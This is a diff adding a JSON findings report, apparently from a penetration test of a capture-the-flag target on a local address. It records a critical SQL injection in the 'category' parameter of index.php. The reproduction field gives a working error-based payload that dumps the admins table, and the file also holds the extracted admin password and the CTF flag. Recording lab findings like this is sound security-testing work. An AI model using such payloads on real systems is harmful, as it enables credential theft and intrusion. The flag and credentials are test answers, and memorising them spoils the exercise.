@@ -1,0 +1,25 @@
+{
+  "meta": {
+    "created": "2026-04-14T23:48:04.987733+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "58def7dc-a57a-4dd8-a55d-7ed599c77967",
+      "timestamp": "2026-04-14T23:48:04.987617+00:00",
+      "title": "SQL Injection in category parameter leading to admin credential disclosure",
+      "severity": "critical",
+      "target": "http://172.17.0.1:49941",
+      "description": "The 'category' GET parameter in index.php is vulnerable to SQL injection. Error-based SQL injection was used to extract credentials from the admins table. The extracted admin credentials (admin:ONEverySecurePassword_!) were used to authenticate to admin.php, which returned the CTF flag.",
+      "evidence": "flag{aee858fc-7ed4-4e52-9a7b-dc67ce9c7d33}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:49941/?category=Nature' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM admins)))-- -",
+        "expected": "Error message containing admin credentials: admin:ONEverySecurePassword_!"
+      }
+    }
+  ],
+  "diagrams": []
+}
